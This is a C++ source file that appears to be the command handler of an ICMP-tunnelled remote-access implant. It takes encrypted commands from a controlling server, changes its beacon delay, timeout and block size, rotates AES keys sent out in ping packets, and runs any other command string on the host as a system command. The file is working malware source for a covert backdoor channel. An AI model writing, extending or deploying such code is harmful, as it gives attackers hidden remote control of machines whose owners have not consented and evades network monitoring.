#include "CommandHandler.h"
#include "AESHandler.h"
#include "helpers.h"
#include <iostream>
#include <vector>
#include <string>

using namespace Helper;

CommandHandler::CommandHandler(Client& client) : client(client) {}

void CommandHandler::handleServerCommand(int sockfd, Custom_icmp icmp, const std::string& ip_addr, bool connected) {
    std::string server_response = client.getServerCommand();
    // Split the server response into parts (command and value)
    auto parts = splitString(server_response);


    // If the command is related to config updates:
    std::string command = parts[0];
    if (command == "exit") {
        client.setClientResponse("OK: Exit");
        Callback(sockfd, icmp, ip_addr, connected, false, true);
        exit(0);
    } else if (command == "delay") {
        client.setClientResponse(setDelay(parts[1]));
        Callback(sockfd, icmp, ip_addr, connected, false);
    } else if (command == "timeout") {
        client.setClientResponse(setTimeout(parts[1]));
        Callback(sockfd, icmp, ip_addr, connected, false);
    } else if (command == "blocksize") {
        client.setClientResponse(setBlocksize(parts[1]));
        Callback(sockfd, icmp, ip_addr, connected, false);
    } else if (command == "updateAES") {
        std::cout <<  "[*] UPDATING AES" << "\n";
        aesHandler->generateKeyAndNonceTemp();
        std::string encryptedAesNonce = aesHandler->encryptKeyAndNonceTemp();
        std::vector<unsigned char> aesu = aesHandler->encryptMessage("AESU");
        std::string combined = encryptedAesNonce + bytes_to_hex(aesu);

        // Split result into blocks
        int blockSize = client.getBlocksize();
        std::vector<std::string> to_server = split(combined, blockSize);

        icmp.sendPing(sockfd, ip_addr, to_server, connected);
        aesHandler->Update();
        
    } 
    // If the command is related to executing a system command
    else {
        if (server_response.size() > 1) {
            std::cout << "\033[32m" << "[+] Client executing command: " << server_response << "\033[0m" << "\n";
            Callback(sockfd, icmp, ip_addr, connected, true);            
            if (client.isCancelCmd()) {
                client.setClientResponse("OK: Cancel "+ server_response);
                Callback(sockfd, icmp, ip_addr, connected, false);
                std::cout << "[*] Server canceled execution of command: " << server_response << "\n";
            }
        }
    }

    // Reset
    client.cleanup();
}



std::string CommandHandler::setDelay(const std::string& delayValue) {
    int delayInSeconds = std::stoi(delayValue);
    client.setDelay(delayInSeconds * 1000);  // Convert to milliseconds
    return "OK packet_delay changed to " + delayValue + "s";
}

std::string CommandHandler::setTimeout(const std::string& timeoutValue) {
    client.setTimeout(std::stoi(timeoutValue) * 1000);  // Convert to milliseconds
    return "OK timeout changed to " + timeoutValue + "s";
}

std::string CommandHandler::setBlocksize(const std::string& blocksizeValue) {
    client.setBlocksize(std::stoi(blocksizeValue));  // Convert to milliseconds
    return "OK blocksize changed to " + blocksizeValue + " bytes";
}
